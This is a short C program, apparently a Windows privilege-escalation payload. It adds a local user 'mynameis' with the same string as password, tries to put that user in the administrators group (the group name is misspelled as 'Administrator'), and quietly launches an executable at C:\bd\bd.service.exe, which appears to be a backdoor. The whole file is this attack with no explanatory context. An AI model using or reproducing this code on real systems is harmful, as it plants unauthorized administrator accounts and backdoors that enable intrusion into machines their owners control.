int main(void){ 
system("net user mynameis mynameis /add"); 
system("net localgroup Administrator mynameis /add"); 
WinExec("C:\\bd\\bd.service.exe",0); 
return 0; 
} 
